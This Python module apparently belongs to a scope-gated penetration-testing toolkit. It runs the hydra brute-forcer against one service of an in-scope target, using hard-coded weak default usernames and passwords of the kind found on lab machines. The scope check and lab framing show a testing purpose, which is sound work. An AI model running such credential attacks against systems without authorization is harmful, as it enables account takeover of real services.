"""Online credential attack (hydra) against ONE service of an in-scope target.
Bounded to a small built-in list of common weak credentials (lab-grade), so the
run stays fast and predictable. Scope-gated like every other tool."""

import os
import subprocess
import tempfile

from scope import load_scope, is_in_scope

USERS = ["msfadmin", "user", "admin", "root", "service", "postgres"]
PASSWORDS = ["msfadmin", "user", "admin", "password", "root", "toor", "postgres", "123456"]


def run_hydra(target, service, scope_file):
    service = "".join(ch for ch in str(service).lower() if ch.isalnum())
    if not service:
        return None
    if not is_in_scope(target, load_scope(scope_file)):
        return None
    uf = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    uf.write("\n".join(USERS) + "\n")
    uf.close()
    pf = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    pf.write("\n".join(PASSWORDS) + "\n")
    pf.close()
    try:
        result = subprocess.run(
            ["hydra", "-L", uf.name, "-P", pf.name, "-t", "4", target, service],
            capture_output=True, text=True, timeout=180,
        )
        return (result.stdout + result.stderr).strip()
    except subprocess.TimeoutExpired:
        return f"hydra on {service} timed out."
    finally:
        os.unlink(uf.name)
        os.unlink(pf.name)
